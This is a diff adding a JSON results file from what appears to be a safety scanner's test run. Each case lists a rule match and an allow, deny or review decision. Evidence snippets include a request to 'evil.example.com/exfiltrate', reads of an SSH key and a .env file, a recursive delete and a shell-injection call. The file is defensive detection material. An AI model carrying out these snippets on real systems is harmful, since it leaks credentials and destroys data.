@@ -1,0 +1,623 @@
+[
+  {
+    "name": "safe_python",
+    "expected_decision": "allow",
+    "actual_decision": "allow",
+    "rule_ids": [
+      "SAFE000"
+    ],
+    "report_id": "rep-c480d658e1ac4c23",
+    "risk_level": "info",
+    "duration_ms": 0.33109996002167463,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-c480d658e1ac4c23",
+      "decision": "allow",
+      "risk_level": "info",
+      "rule_ids": [
+        "SAFE000"
+      ],
+      "findings": [],
+      "recommendation": "No safety rules matched.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "abceeaaec48b8039440cfe2965b16b583fdbba619fdee4ef37e2bacb0a3409c6",
+      "scan_duration_ms": 0.33109996002167463,
+      "redacted": false
+    }
+  },
+  {
+    "name": "safe_bash",
+    "expected_decision": "allow",
+    "actual_decision": "allow",
+    "rule_ids": [
+      "SAFE000"
+    ],
+    "report_id": "rep-91d203cd74a9499d",
+    "risk_level": "info",
+    "duration_ms": 0.5583000602200627,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-91d203cd74a9499d",
+      "decision": "allow",
+      "risk_level": "info",
+      "rule_ids": [
+        "SAFE000"
+      ],
+      "findings": [],
+      "recommendation": "No safety rules matched.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "ed01a81b947444d4baffce077fd4092f927bbc7fcf3d85ad5e3ad665cedb59d6",
+      "scan_duration_ms": 0.5583000602200627,
+      "redacted": false
+    }
+  },
+  {
+    "name": "dangerous_recursive_delete",
+    "expected_decision": "deny",
+    "actual_decision": "deny",
+    "rule_ids": [
+      "FILE001_RECURSIVE_DELETE"
+    ],
+    "report_id": "rep-48536314ac6f45a2",
+    "risk_level": "critical",
+    "duration_ms": 0.3353999927639961,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-48536314ac6f45a2",
+      "decision": "deny",
+      "risk_level": "critical",
+      "rule_ids": [
+        "FILE001_RECURSIVE_DELETE"
+      ],
+      "findings": [
+        {
+          "rule_id": "FILE001_RECURSIVE_DELETE",
+          "category": "file",
+          "risk_level": "critical",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "shutil.rmtree(path)",
+            "line": 12,
+            "column": 5,
+            "language": "python",
+            "extras": {
+              "target": "path",
+              "explicit": "False"
+            }
+          },
+          "recommendation": "Avoid recursive delete; require explicit file list."
+        }
+      ],
+      "recommendation": "Block execution and request a human-approved path.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "190f022e0277f968f73f655c896143edd741fd126d3e4e2032ef49117e533bd9",
+      "scan_duration_ms": 0.3353999927639961,
+      "redacted": false
+    }
+  },
+  {
+    "name": "read_ssh_key",
+    "expected_decision": "deny",
+    "actual_decision": "deny",
+    "rule_ids": [
+      "FILE003_CREDENTIAL_READ"
+    ],
+    "report_id": "rep-514e7d65ccf04b24",
+    "risk_level": "critical",
+    "duration_ms": 0.43290003668516874,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-514e7d65ccf04b24",
+      "decision": "deny",
+      "risk_level": "critical",
+      "rule_ids": [
+        "FILE003_CREDENTIAL_READ"
+      ],
+      "findings": [
+        {
+          "rule_id": "FILE003_CREDENTIAL_READ",
+          "category": "file",
+          "risk_level": "critical",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "path.read_text()",
+            "line": 14,
+            "column": 12,
+            "language": "python",
+            "extras": {
+              "target": "<dynamic>/.ssh/id_rsa"
+            }
+          },
+          "recommendation": "Reading credentials at runtime is forbidden."
+        }
+      ],
+      "recommendation": "Block execution and request a human-approved path.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "12ecf602862d52505db684562b72f6344a1215e900530a08b3d403f640cd3bdc",
+      "scan_duration_ms": 0.43290003668516874,
+      "redacted": false
+    }
+  },
+  {
+    "name": "non_allowlist_network",
+    "expected_decision": "deny",
+    "actual_decision": "deny",
+    "rule_ids": [
+      "NET001_DOMAIN_NOT_ALLOWED"
+    ],
+    "report_id": "rep-6e2b248939f3442b",
+    "risk_level": "high",
+    "duration_ms": 0.42990001384168863,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-6e2b248939f3442b",
+      "decision": "deny",
+      "risk_level": "high",
+      "rule_ids": [
+        "NET001_DOMAIN_NOT_ALLOWED"
+      ],
+      "findings": [
+        {
+          "rule_id": "NET001_DOMAIN_NOT_ALLOWED",
+          "category": "network",
+          "risk_level": "high",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "requests.get(\"https://evil.example.com/exfiltrate\", timeout=5)",
+            "line": 12,
+            "column": 16,
+            "language": "python",
+            "extras": {
+              "host": "evil.example.com",
+              "library": "requests"
+            }
+          },
+          "recommendation": "Host is not on the allow list; add it explicitly."
+        }
+      ],
+      "recommendation": "Block execution and request a human-approved path.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "4b9ead86041e4de5143a88150db65414d87478f4101e75b05dc17640f5450f90",
+      "scan_duration_ms": 0.42990001384168863,
+      "redacted": false
+    }
+  },
+  {
+    "name": "allowlist_network",
+    "expected_decision": "allow",
+    "actual_decision": "allow",
+    "rule_ids": [
+      "SAFE000"
+    ],
+    "report_id": "rep-dc1032b0e1e244fa",
+    "risk_level": "info",
+    "duration_ms": 0.4124999977648258,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-dc1032b0e1e244fa",
+      "decision": "allow",
+      "risk_level": "info",
+      "rule_ids": [
+        "SAFE000"
+      ],
+      "findings": [],
+      "recommendation": "No safety rules matched.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "91ec771a616b8170154dc89c2f9b857561a41d94f642ee5be6809cf578b60233",
+      "scan_duration_ms": 0.4124999977648258,
+      "redacted": false
+    }
+  },
+  {
+    "name": "allowed_subprocess",
+    "expected_decision": "allow",
+    "actual_decision": "allow",
+    "rule_ids": [
+      "SAFE000"
+    ],
+    "report_id": "rep-423ebc2911ef4833",
+    "risk_level": "info",
+    "duration_ms": 0.4381999606266618,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-423ebc2911ef4833",
+      "decision": "allow",
+      "risk_level": "info",
+      "rule_ids": [
+        "SAFE000"
+      ],
+      "findings": [],
+      "recommendation": "No safety rules matched.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "c4964d41038acace3b140b307c78f2c059a6b6cf21c677f9fb386a7dc5013093",
+      "scan_duration_ms": 0.4381999606266618,
+      "redacted": false
+    }
+  },
+  {
+    "name": "shell_injection",
+    "expected_decision": "deny",
+    "actual_decision": "deny",
+    "rule_ids": [
+      "PROC002_SHELL_INJECTION",
+      "PROC003_SHELL_OPERATOR"
+    ],
+    "report_id": "rep-093190edb1a84df9",
+    "risk_level": "critical",
+    "duration_ms": 0.4626999143511057,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-093190edb1a84df9",
+      "decision": "deny",
+      "risk_level": "critical",
+      "rule_ids": [
+        "PROC002_SHELL_INJECTION",
+        "PROC003_SHELL_OPERATOR"
+      ],
+      "findings": [
+        {
+          "rule_id": "PROC002_SHELL_INJECTION",
+          "category": "process",
+          "risk_level": "critical",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "subprocess.run(\n        f\"ls {user_input}\", shell=True, check=False,\n    )",
+            "line": 12,
+            "column": 12,
+            "language": "python",
+            "extras": {
+              "executable": "<dynamic>"
+            }
+          },
+          "recommendation": "Use argument lists (shell=False) to avoid shell injection."
+        },
+        {
+          "rule_id": "PROC003_SHELL_OPERATOR",
+          "category": "process",
+          "risk_level": "medium",
+          "decision": "needs_human_review",
+          "evidence": {
+            "snippet": "subprocess.run(\n        f\"ls {user_input}\", shell=True, check=False,\n    )",
+            "line": 12,
+            "column": 12,
+            "language": "python",
+            "extras": {
+              "operator": "shell=True"
+            }
+          },
+          "recommendation": "Shell operators require review; split into explicit steps."
+        }
+      ],
+      "recommendation": "Block execution and request a human-approved path.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "2d43a58affa3528860aa1a7fa400b161c4e766138a50e1f94ceaa20413a0960a",
+      "scan_duration_ms": 0.4626999143511057,
+      "redacted": false
+    }
+  },
+  {
+    "name": "dependency_install",
+    "expected_decision": "deny",
+    "actual_decision": "deny",
+    "rule_ids": [
+      "DEP001_ENV_MUTATION",
+      "PROC001_PROCESS_EXEC"
+    ],
+    "report_id": "rep-9a8c142c06454d17",
+    "risk_level": "high",
+    "duration_ms": 0.3119000466540456,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-9a8c142c06454d17",
+      "decision": "deny",
+      "risk_level": "high",
+      "rule_ids": [
+        "DEP001_ENV_MUTATION",
+        "PROC001_PROCESS_EXEC"
+      ],
+      "findings": [
+        {
+          "rule_id": "DEP001_ENV_MUTATION",
+          "category": "dependency",
+          "risk_level": "high",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "pip install requests",
+            "line": 7,
+            "column": 1,
+            "language": "bash",
+            "extras": {
+              "manager": "pip",
+              "command": "pip install requests"
+            }
+          },
+          "recommendation": "Dependency installation mutates the runtime image."
+        },
+        {
+          "rule_id": "DEP001_ENV_MUTATION",
+          "category": "dependency",
+          "risk_level": "high",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "npm install lodash",
+            "line": 8,
+            "column": 1,
+            "language": "bash",
+            "extras": {
+              "manager": "npm",
+              "command": "npm install lodash"
+            }
+          },
+          "recommendation": "Dependency installation mutates the runtime image."
+        },
+        {
+          "rule_id": "PROC001_PROCESS_EXEC",
+          "category": "process",
+          "risk_level": "low",
+          "decision": "needs_human_review",
+          "evidence": {
+            "snippet": "pip install requests",
+            "line": 7,
+            "column": 1,
+            "language": "bash",
+            "extras": {
+              "executable": "pip"
+            }
+          },
+          "recommendation": "Executable is not on the configured allow list."
+        },
+        {
+          "rule_id": "PROC001_PROCESS_EXEC",
+          "category": "process",
+          "risk_level": "low",
+          "decision": "needs_human_review",
+          "evidence": {
+            "snippet": "npm install lodash",
+            "line": 8,
+            "column": 1,
+            "language": "bash",
+            "extras": {
+              "executable": "npm"
+            }
+          },
+          "recommendation": "Executable is not on the configured allow list."
+        }
+      ],
+      "recommendation": "Block execution and request a human-approved path.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "c5eac42d35862e3dfb843d596a6239960e1d826180f0a77b20874c79918d86a3",
+      "scan_duration_ms": 0.3119000466540456,
+      "redacted": false
+    }
+  },
+  {
+    "name": "infinite_loop",
+    "expected_decision": "deny",
+    "actual_decision": "deny",
+    "rule_ids": [
+      "RES001_UNBOUNDED_LOOP"
+    ],
+    "report_id": "rep-27a15ba6e65f417b",
+    "risk_level": "high",
+    "duration_ms": 0.3092000260949135,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-27a15ba6e65f417b",
+      "decision": "deny",
+      "risk_level": "high",
+      "rule_ids": [
+        "RES001_UNBOUNDED_LOOP"
+      ],
+      "findings": [
+        {
+          "rule_id": "RES001_UNBOUNDED_LOOP",
+          "category": "resource",
+          "risk_level": "high",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "while True:\n        print(\"looping forever\")",
+            "line": 10,
+            "column": 5,
+            "language": "python",
+            "extras": {
+              "kind": "while-True"
+            }
+          },
+          "recommendation": "Loop has no static exit condition; rewrite with a bounded range."
+        }
+      ],
+      "recommendation": "Block execution and request a human-approved path.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "010acb05343fb58a55c4c476833b41aa92ec3f4d92c0a215c3fdfe7e056933d3",
+      "scan_duration_ms": 0.3092000260949135,
+      "redacted": false
+    }
+  },
+  {
+    "name": "secret_output",
+    "expected_decision": "deny",
+    "actual_decision": "deny",
+    "rule_ids": [
+      "SECRET001_LOG_SINK"
+    ],
+    "report_id": "rep-3990531467af4b11",
+    "risk_level": "high",
+    "duration_ms": 0.3779999678954482,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-3990531467af4b11",
+      "decision": "deny",
+      "risk_level": "high",
+      "rule_ids": [
+        "SECRET001_LOG_SINK"
+      ],
+      "findings": [
+        {
+          "rule_id": "SECRET001_LOG_SINK",
+          "category": "secret",
+          "risk_level": "high",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "print(f\"token is {token}\")",
+            "line": 13,
+            "column": 5,
+            "language": "python",
+            "extras": {
+              "source": "<tainted>",
+              "sink": "print"
+            }
+          },
+          "recommendation": "Secret-looking value flows into a log/print sink."
+        }
+      ],
+      "recommendation": "Block execution and request a human-approved path.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "cb3345effcde943a3ff41940a638a0b6d3858874fe1c2d24fc915d7ea11391df",
+      "scan_duration_ms": 0.3779999678954482,
+      "redacted": false
+    }
+  },
+  {
+    "name": "bash_pipeline",
+    "expected_decision": "needs_human_review",
+    "actual_decision": "needs_human_review",
+    "rule_ids": [
+      "PROC003_SHELL_OPERATOR"
+    ],
+    "report_id": "rep-d1c13e8c7d5c4570",
+    "risk_level": "medium",
+    "duration_ms": 0.2742999931797385,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-d1c13e8c7d5c4570",
+      "decision": "needs_human_review",
+      "risk_level": "medium",
+      "rule_ids": [
+        "PROC003_SHELL_OPERATOR"
+      ],
+      "findings": [
+        {
+          "rule_id": "PROC003_SHELL_OPERATOR",
+          "category": "process",
+          "risk_level": "medium",
+          "decision": "needs_human_review",
+          "evidence": {
+            "snippet": "|",
+            "line": 8,
+            "column": 10,
+            "language": "bash",
+            "extras": {
+              "operator": "|"
+            }
+          },
+          "recommendation": "Shell operators require review; split into explicit steps."
+        }
+      ],
+      "recommendation": "Pause for human review before executing.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "51ba004f95b1c70917f73e0505224f8b3f5336c1a9749cbcc74294a5853c12bf",
+      "scan_duration_ms": 0.2742999931797385,
+      "redacted": false
+    }
+  },
+  {
+    "name": "read_dotenv",
+    "expected_decision": "deny",
+    "actual_decision": "deny",
+    "rule_ids": [
+      "FILE004_DOTENV_READ"
+    ],
+    "report_id": "rep-9830d02b7bfd44a3",
+    "risk_level": "high",
+    "duration_ms": 0.3378000110387802,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-9830d02b7bfd44a3",
+      "decision": "deny",
+      "risk_level": "high",
+      "rule_ids": [
+        "FILE004_DOTENV_READ"
+      ],
+      "findings": [
+        {
+          "rule_id": "FILE004_DOTENV_READ",
+          "category": "file",
+          "risk_level": "high",
+          "decision": "deny",
+          "evidence": {
+            "snippet": "cat .env",
+            "line": 8,
+            "column": 1,
+            "language": "bash",
+            "extras": {
+              "target": ".env"
+            }
+          },
+          "recommendation": "Loading .env at runtime can leak secrets; inject via env."
+        }
+      ],
+      "recommendation": "Block execution and request a human-approved path.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "aa52682b688ee2ac1359c7f1735b4156d13b51435ddd5b6cf023ea79008089cf",
+      "scan_duration_ms": 0.3378000110387802,
+      "redacted": false
+    }
+  },
+  {
+    "name": "dynamic_command_review",
+    "expected_decision": "needs_human_review",
+    "actual_decision": "needs_human_review",
+    "rule_ids": [
+      "PROC001_PROCESS_EXEC"
+    ],
+    "report_id": "rep-6dd75a5ba8ee4200",
+    "risk_level": "medium",
+    "duration_ms": 0.47910003922879696,
+    "matches_expected": true,
+    "report": {
+      "report_id": "rep-6dd75a5ba8ee4200",
+      "decision": "needs_human_review",
+      "risk_level": "medium",
+      "rule_ids": [
+        "PROC001_PROCESS_EXEC"
+      ],
+      "findings": [
+        {
+          "rule_id": "PROC001_PROCESS_EXEC",
+          "category": "process",
+          "risk_level": "medium",
+          "decision": "needs_human_review",
+          "evidence": {
+            "snippet": "subprocess.run(user_command, shell=False)",
+            "line": 19,
+            "column": 12,
+            "language": "python",
+            "extras": {
+              "executable": "<dynamic>"
+            }
+          },
+          "recommendation": "Process executable is computed at runtime; review before executing."
+        }
+      ],
+      "recommendation": "Pause for human review before executing.",
+      "policy_hash": "b2fdff89270f2f5e19eb4d5dd00c222a15a802d46806318863ae8af88d79cf38",
+      "policy_version": "1",
+      "script_sha256": "d7c9ce3aa62f072faa9355fc411d807a933f34d770aa626e78c43607cb795a92",
+      "scan_duration_ms": 0.47910003922879696,
+      "redacted": false
+    }
+  }
+]
